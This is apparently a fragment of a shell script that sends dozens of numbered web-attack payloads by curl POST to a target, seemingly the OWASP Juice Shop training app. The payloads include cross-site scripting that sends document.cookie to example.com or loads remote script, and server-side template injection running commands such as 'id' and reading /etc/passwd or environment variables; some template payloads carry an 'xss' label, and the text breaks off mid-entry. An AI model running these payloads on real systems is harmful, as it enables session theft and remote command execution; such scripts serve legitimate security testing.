echo "=== juiceshop-0188 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<body onload="alert(1)">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<body onload=\"alert(1)\">"}' | head -8
echo
echo "=== juiceshop-0189 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>document.write('\''<img src="http://example.com/xss.png?c='\'' + document.cookie + '\''">'\'')</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>document.write('\''<img src=\"http://example.com/xss.png?c='\'' + document.cookie + '\''\">'\'')</script>"}' | head -8
echo
echo "=== juiceshop-0190 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>"}' | head -8
echo
echo "=== juiceshop-0191 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<img src="x" onerror="eval(atob('\''YWxlcnQoMSk='\''))">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<img src=\"x\" onerror=\"eval(atob('\''YWxlcnQoMSk='\''))\">"}' | head -8
echo
echo "=== juiceshop-0192 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";a.click();</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var a=document.createElement(\"a\");a.href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\";a.click();</script>"}' | head -8
echo
echo "=== juiceshop-0193 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var s=document.createElement("script");s.src="http://example.com/xss.js";document.body.appendChild(s);</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var s=document.createElement(\"script\");s.src=\"http://example.com/xss.js\";document.body.appendChild(s);</script>"}' | head -8
echo
echo "=== juiceshop-0194 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var i=new Image();i.src="http://example.com/xss.png?c="+document.cookie;document.body.appendChild(i);</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var i=new Image();i.src=\"http://example.com/xss.png?c=\"+document.cookie;document.body.appendChild(i);</script>"}' | head -8
echo
echo "=== juiceshop-0195 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>fetch("http://example.com/xss.php?c="+document.cookie);</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>fetch(\"http://example.com/xss.php?c=\"+document.cookie);</script>"}' | head -8
echo
echo "=== juiceshop-0196 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var x=new XMLHttpRequest();x.open("GET","http://example.com/xss.php?c="+document.cookie,true);x.send();</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var x=new XMLHttpRequest();x.open(\"GET\",\"http://example.com/xss.php?c=\"+document.cookie,true);x.send();</script>"}' | head -8
echo
echo "=== juiceshop-0197 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var s=document.createElement("iframe");s.src="http://example.com/xss.php?c="+document.cookie;document.body.appendChild(s);</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var s=document.createElement(\"iframe\");s.src=\"http://example.com/xss.php?c=\"+document.cookie;document.body.appendChild(s);</script>"}' | head -8
echo
echo "=== juiceshop-0198 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>var l=document.createElement("link");l.rel="stylesheet";l.href="http://example.com/xss.css";document.head.appendChild(l);</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>var l=document.createElement(\"link\");l.rel=\"stylesheet\";l.href=\"http://example.com/xss.css\";document.head.appendChild(l);</script>"}' | head -8
echo
echo "=== juiceshop-0199 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;img src=x onerror=alert('\''Payload1'\'')&#x3E;"}' | head -8
echo
echo "=== juiceshop-0200 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;svg onload=alert('\''Payload2'\'')&#x3E;"}' | head -8
echo
echo "=== juiceshop-0201 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;object data=javascript:alert('\''Payload3'\'')&#x3E;"}' | head -8
echo
echo "=== juiceshop-0202 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;body onload=alert('\''Payload4'\'')&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;body onload=alert('\''Payload4'\'')&#x3E;"}' | head -8
echo
echo "=== juiceshop-0203 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;img src=x:alert(alt) onerror=eval(src) alt='\''Payload5'\''&#x3E;"}' | head -8
echo
echo "=== juiceshop-0204 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;script&#x3E;eval(String.fromCharCode(97,108,101,114,116,40,39,Payload6,39,41))&#x3C;/script&#x3E;"}' | head -8
echo
echo "=== juiceshop-0205 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;!--%2Balert('\''Payload7'\'')%2B--&#x3E;"}' | head -8
echo
echo "=== juiceshop-0206 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;style&#x3E;*\{x:expression(alert('\''Payload8'\''))\}&#x3C;/style&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;style&#x3E;*\\{x:expression(alert('\''Payload8'\''))\\}&#x3C;/style&#x3E;"}' | head -8
echo
echo "=== juiceshop-0207 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;input value=`` onfocus=alert('\''Payload9'\'') autofocus&#x3E;"}' | head -8
echo
echo "=== juiceshop-0208 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;form&#x3E;&#x3C;button onclick=alert('\''Payload10'\'')&#x3E;X&#x3C;/button&#x3E;&#x3C;/form&#x3E;"}' | head -8
echo
echo "=== juiceshop-0209 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;iframe src=javascript:alert('\''Payload11'\'')&#x3E;&#x3C;/iframe&#x3E;"}' | head -8
echo
echo "=== juiceshop-0210 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;a href=javascript:alert('\''Payload12'\'')&#x3E;Link&#x3C;/a&#x3E;"}' | head -8
echo
echo "=== juiceshop-0211 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUGF5bG9hZDEzJyk8L3NjcmlwdD4&#x3E;Link&#x3C;/a&#x3E;"}' | head -8
echo
echo "=== juiceshop-0212 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;div onmouseover=alert('\''Payload14'\'')&#x3E;Hover over me&#x3C;/div&#x3E;"}' | head -8
echo
echo "=== juiceshop-0213 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;input type=image src=x onerror=alert('\''Payload15'\'')&#x3E;"}' | head -8
echo
echo "=== juiceshop-0214 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;audio src=javascript:alert('\''Payload16'\'')&#x3E;&#x3C;/audio&#x3E;"}' | head -8
echo
echo "=== juiceshop-0215 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&#x3C;video src=javascript:alert('\''Payload17'\'')&#x3E;&#x3C;/video&#x3E;"}' | head -8
echo
echo "=== juiceshop-0216 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '<%= 7 * 7 %>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<%= 7 * 7 %>"}' | head -8
echo
echo "=== juiceshop-0217 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '$\{7*7\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{7*7\\}"}' | head -8
echo
echo "=== juiceshop-0218 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{T(java.lang.Runtime).getRuntime().exec('\''id'\'')\\}"}' | head -8
echo
echo "=== juiceshop-0219 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '%7B%7B7*7%7D%7D'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%7B%7B7*7%7D%7D"}' | head -8
echo
echo "=== juiceshop-0220 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '%24%7B7*7%7D'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%24%7B7*7%7D"}' | head -8
echo
echo "=== juiceshop-0221 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '$\{3*3\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{3*3\\}"}' | head -8
echo
echo "=== juiceshop-0222 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '$\{\{7*7\}\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{\\{7*7\\}\\}"}' | head -8
echo
echo "=== juiceshop-0223 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '@(1+2)'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "@(1+2)"}' | head -8
echo
echo "=== juiceshop-0224 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<%= File.open('\''/etc/passwd'\'').read %>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<%= File.open('\''/etc/passwd'\'').read %>"}' | head -8
echo
echo "=== juiceshop-0225 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '<#assign ex = "freemarker.template.utility.Execute"?new()>$\{ ex("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>$\\{ ex(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0226 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\{ ex('\''id'\'')\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "[#assign ex = '\''freemarker.template.utility.Execute'\''?new()]$\\{ ex('\''id'\'')\\}"}' | head -8
echo
echo "=== juiceshop-0227 | tuning=ssti | method=POST-body ==="
printf '    payload: %s\n' '$\{"freemarker.template.utility.Execute"?new()("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{\"freemarker.template.utility.Execute\"?new()(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0228 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{T(java.lang.System).getenv()\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{T(java.lang.System).getenv()\\}"}' | head -8
echo
echo "=== juiceshop-0229 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{T(java.lang.Runtime).getRuntime().exec('\''cat etc/passwd'\'')\\}"}' | head -8
echo
echo "=== juiceshop-0230 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\}$\{self.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())\\}$\\{self.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0231 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0232 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0233 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.cache.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0234 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.__init__.__globals__['\''util'\''].os.system('\''id'\'')\\}"}' | head -8
echo
echo "=== juiceshop-0235 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0236 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.filters.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0237 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0238 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.exceptions.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0239 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.__init__.__globals__['\''os'\''].system('\''id'\'')\\}"}' | head -8
echo
echo "=== juiceshop-0240 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.cache.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.cache.util.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0241 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.util.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0242 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0243 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.cache.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.cache.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0244 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.cache.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.cache.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0245 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template._mmarker.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template._mmarker.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0246 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0247 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.filters.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0248 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0249 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.filters.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.filters.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0250 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0251 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.exceptions.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0252 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0253 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.cache.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.cache.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0254 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.exceptions.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0255 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.cache.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.cache.util.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0256 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.context._with_template.module.runtime.util.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0257 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.cache.util.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.cache.util.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0258 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.template.module.runtime.util.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0259 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.util.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.util.compat.inspect.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0260 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.traceback.linecache.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0261 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$\{self.module.runtime.exceptions.util.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{self.module.runtime.exceptions.util.compat.inspect.os.system(\"id\")\\}"}' | head -8
echo
echo "=== juiceshop-0262 | tuning=xss | method=POST-body ==="
